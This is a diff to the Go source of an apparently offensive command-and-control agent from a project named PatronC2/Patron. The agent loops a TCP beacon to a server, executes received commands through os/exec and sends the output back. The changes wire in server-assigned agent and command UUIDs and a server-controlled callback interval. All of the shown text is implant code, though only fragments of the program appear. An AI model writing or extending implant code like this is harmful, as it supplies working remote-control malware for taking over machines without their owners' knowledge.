@@ -5,11 +5,11 @@ import (
 	"log"
 	"net"
 	"os/exec"
+	"strconv"
 	"time"
 
 	"github.com/google/uuid"
 
-	"github.com/PatronC2/Patron/data"
 	"github.com/PatronC2/Patron/types"
 	"github.com/s-christian/gollehs/lib/logger"
 )
@@ -21,12 +21,6 @@ import (
 func main() {
 	Agentuuid := uuid.New().String()
 
-	err := data.OpenDatabase()
-	if err != nil {
-		logger.Logf(logger.Info, "Error in DB\n")
-		log.Fatalln(err)
-	}
-	data.CreateAgent(Agentuuid, "127.0.0.1", "5", "5")
 	for {
 		beacon, err := net.Dial("tcp", "127.0.0.1:6969")
 		if err != nil {
@@ -68,9 +62,10 @@ func main() {
 			// beacon.Write(buf)
 		}
 		destruct := types.GiveServerResult{
-			Uuid:   "77777-777777-777777",
-			Result: "whoami",
-			Output: CmdOut,
+			Uuid:        instruct.UpdateAgentConfig.Uuid,
+			Result:      "1",
+			Output:      CmdOut,
+			CommandUUID: instruct.CommandUUID,
 		}
 		err = encoder.Encode(destruct)
 		if err != nil {
@@ -82,7 +77,8 @@ func main() {
 		// 	continue
 		// }
 		beacon.Close()
-		time.Sleep(time.Second * 5) // interval and jitter here
+		intVar, err := strconv.Atoi(instruct.UpdateAgentConfig.CallbackFrequency) // apply CallbackFrequency
+		time.Sleep(time.Second * time.Duration(intVar))                           // interval and jitter here
 	}
 
 }
